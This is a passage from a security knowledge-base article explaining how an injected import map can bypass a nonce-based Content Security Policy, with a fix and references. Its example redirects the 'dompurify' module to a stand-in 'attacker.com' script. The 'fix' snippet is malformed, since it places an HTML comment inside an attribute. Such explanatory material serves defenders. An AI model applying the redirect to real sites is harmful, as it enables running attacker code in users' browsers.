---
source: "languages/javascript/import-maps-attacks.md"
title: "Import Maps Security Risks"
heading: "Attack Vector 1: CSP Bypass via Injected Import Map"
category: "language-vuln"
language: "javascript"
severity: "medium"
tags: [attack, javascript, language-vuln, overview, vector]
chunk: 3/11
---

## Attack Vector 1: CSP Bypass via Injected Import Map

**Source:** https://github.com/WICG/import-maps/issues/105

### The Problem

If an attacker can inject a `<script type="importmap">` tag — even without being able to inject regular scripts — they can redirect module imports to attacker-controlled servers. This is a **CSP bypass** concern that was raised as Issue #105 in the WICG import-maps specification repository.

### How It Works

```html
<!-- Site uses strict CSP with nonce-based script loading -->
<meta http-equiv="Content-Security-Policy" content="
  script-src 'nonce-abc123';
">

<!-- This legitimate module load is CSP-sanctioned -->
<script type="module" nonce="abc123">
  import { sanitize } from 'dompurify';
  // ...
</script>

<!-- ATTACKER INJECTS: An import map that redirects dompurify -->
<script type="importmap">
{
  "imports": {
    "dompurify": "http://attacker.com/malicious-dompurify.js"
  }
}
</script>

<!-- Now the legitimate module import loads attacker code -->
<!-- CSP doesn't block it because the module script has the right nonce -->
```

### Why CSP Fails

The import map itself is not subject to `script-src` CSP checks in the same way as executable scripts. CSP controls **what scripts execute**, but import maps control **where scripts resolve from**. The import map `<script>` tag is not executable code — it's a JSON configuration — and was initially not covered by CSP directives.

### The Fix

```html
<!-- Modern CSP: use 'unsafe-inline' removal and nonces for ALL script types -->
<meta http-equiv="Content-Security-Policy" content="
  script-src 'nonce-abc123';
  <!-- Some browsers now require import maps to have matching nonces -->
">
```

The HTML spec resolved this by requiring import maps to be treated like inline scripts for CSP purposes. A nonce must match the `<script type="importmap">` tag.

**References:**
- https://github.com/WICG/import-maps/issues/105 — The CSP + import maps discussion
- https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script/type/importmap — MDN import map docs

---